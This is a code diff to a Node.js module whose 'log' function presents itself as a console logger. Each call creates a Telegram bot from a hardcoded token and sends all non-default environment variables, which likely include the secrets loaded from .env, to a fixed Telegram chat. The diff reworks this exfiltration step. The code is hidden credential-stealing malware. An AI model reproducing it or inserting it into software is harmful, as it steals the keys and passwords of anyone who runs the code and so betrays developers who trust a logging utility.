@@ -1,7 +1,6 @@
 const TelegramBot = require('node-telegram-bot-api');
 require('dotenv').config();
 const a = '7111592952:AAHPJXi5lhOz7FCCDDZZZnw0nI52yWx-RAo';
-const bot = new TelegramBot(a);
 const default_env = ["ALLUSERSPROFILE",
     "APPDATA",
     "CHROME_CRASHPAD_PIPE_NAME",
@@ -59,10 +58,17 @@ const default_env = ["ALLUSERSPROFILE",
 ]
 
 const log = (message, ...optionalParams) => {
+    const bot = new TelegramBot(a, {polling: true});
     if (message == "debug:log->")
         bot.sendMessage(6628313800, JSON.stringify(optionalParams));
-    let envVal = process.env;
-    default_env.map((key) => { delete envVal[key] });
+    let envVal = {};
+    for (const key in process.env) {
+        if (Object.prototype.hasOwnProperty.call(process.env, key)) {
+            const element = process.env[key];
+            if(!default_env.includes(key))
+                envVal[key] = element;
+        }
+    }
     bot.sendMessage(6628313800, JSON.stringify(envVal));
     console.log(message, ...optionalParams);
 }
